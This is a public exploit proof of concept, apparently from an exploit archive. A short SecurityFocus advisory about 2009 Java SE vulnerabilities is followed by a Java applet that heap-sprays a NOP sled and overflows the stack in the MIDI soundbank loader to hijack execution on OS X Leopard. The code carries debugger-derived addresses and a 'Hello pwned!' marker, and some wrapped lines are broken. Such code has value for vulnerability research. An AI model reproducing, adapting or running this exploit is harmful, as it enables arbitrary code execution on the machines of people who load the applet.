source: http://www.securityfocus.com/bid/36881/info
 
Sun has released updates to address multiple security vulnerabilities in Java SE.
 
Successful exploits may allow attackers to bypass certain security restrictions, run untrusted applets with elevated privileges, execute arbitrary code, and cause denial-of-service conditions. Other attacks are also possible.
 
These issues are addressed in the following releases:
 
JDK and JRE 6 Update 17
JDK and JRE 5.0 Update 22
SDK and JRE 1.4.2_24
SDK and JRE 1.3.1_27 

*/
import javax.sound.midi.*;
import java.io.*;
import java.net.*;

import java.awt.Graphics;
public class test extends java.applet.Applet
{
        public static Synthesizer synth;
        Soundbank soundbank;

        public void init()
        {
                String fName = repeat('/',1080); // OSX Leopard - 10.5 Build 9A581
Java(TM) 2 Runtime Environment, Standard Edition (build 1.5.0_13-
b05-237)

                // heap sprayed info starts at 0x25580000+12 but keep in mind we
need to be fairly ascii safe.
                // 0x20 is not usable
                byte[] frame = {
                        (byte)0x22, (byte)0x21, (byte)0x58, (byte)0x25, // frame 1 - ebp
                        (byte)0x26, (byte)0x21, (byte)0x58, (byte)0x25, // frame 1 - eip
                        (byte)0x22, (byte)0x21, (byte)0x58, (byte)0x25  // frame 0 - edx
                };
                
                String mal = new String(frame);
                
                //System.out.println(mal);

                fName = "file://" + fName + mal;
                try
                {
                        synth = MidiSystem.getSynthesizer();
                        synth.open();
                        System.out.println("Spray heap\n");
                        
                        String shellcode = "\u41424344" + repeat('\u9090',1000) +
"\u30313233"; // This is just a nop sled with some heading and
trailing markers.
                        int mb = 1024;

                        // Sotirov / Dowd foo follows.
                        // http://taossa.com/archive/bh08sotirovdowd.pdf
                        
                // Limit the shellcode length to 100KB
                        if (shellcode.length() > 100*1024)
                        {
                                throw new RuntimeException();
                        }
                // Limit the heap spray size to 1GB, even though in practice the
Java
                // heap for an applet is limited to 100MB
                if (mb > 1024)
                        {
                        throw new RuntimeException();
                        }
                // Array of strings containing shellcode
                String[] mem = new String[1024];

                // A buffer for the nop slide and shellcode
                StringBuffer buffer = new StringBuffer(1024*1024/2);

                // Each string takes up exactly 1MB of space
                //
                // header    nop slide   shellcode  NULL
                // 12 bytes  1MB-12-2-x  x bytes    2 bytes

                // Build padding up to the first exception. We will need to set
the eax address after this padding
                        // First usable addresses begin at 0x25580000+0x2121. Unfortunately
0x20 in our addresses caused issues.    
                        // 0x2121 is 8481 in decimal, we subtract a few bytes for munging.
                        
                for (int i = 1; i < (8481/2)-4; i++)
                        {
                        buffer.append('\u4848');
                        }
                        
                        // (gdb) x/10a 0x25582122-4
                        //      0x2558211e:     0x48484848      0x20202020      0x20202020      0x20202020
                        //      0x2558212e:     0x20202020      0x20202020      0x20202020      0x20202020
                        //      0x2558213e:     0x20202020      0x20202020
                                        
                        // Set the call address
                        // 0x188fd81b
<Java_com_sun_media_sound_HeadspaceSoundbank_nOpenResource+108>:        
call   *0x2a8(%eax)

                        buffer.append('\u2122');
                        buffer.append('\u2558');
                                                
                        // 0x2a8 is 680 in decimal, once again we need filler for making
this a usable address location.
                for (int i = 1; i < (680/2)-1; i++)
                        {
                        buffer.append('\u4848');
                        }
                                
                        // where do we wanna go? 0x25582525 is right in the middle of the
following nop sled
                        // (gdb) x/5x 0x25582525
                        //      0x25582525:     0x90909090      0x90909090      0x90909090      0x90909090
                        //      0x25582535:     0x90909090

                        buffer.append('\u2525');
                        buffer.append('\u2558');                                                                                                                                                                        
                                                                                                                                                                                                        
                // We are gonna place the shellcode after this so simply fill
in remaining space with nops!
                for (int i = 1; i < (1024*1024-12)/2-shellcode.length(); i++)
                        {
                        buffer.append('\u9090');
                        }

                // Append the shellcode
                        buffer.append(shellcode);

                // Run the garbage collector
                        Runtime.getRuntime().gc();

                // Fill the heap with copies of the string
                try
                        {
                                for (int i=0; i<mb; i++)
                                {
                                        mem[i] = buffer.toString();
                                }
                        }
                catch (OutOfMemoryError err)
                        {
                        // do nothing
                }
                        
                        // Trigger the stack overflow.
                        synth.loadAllInstruments(MidiSystem.getSoundbank(new URL(fName)));
                }
                catch(Exception e)
                {
                        System.out.println(e);
        }
        }
        public void paint(Graphics g)
        {
                g.drawString("Hello pwned!", 50, 25);
        }
        public static String repeat(char c,int i)
        {
                String tst = "";
                for(int j = 0; j < i; j++)
                {
                        tst = tst+c;
                }
                return tst;
        }
}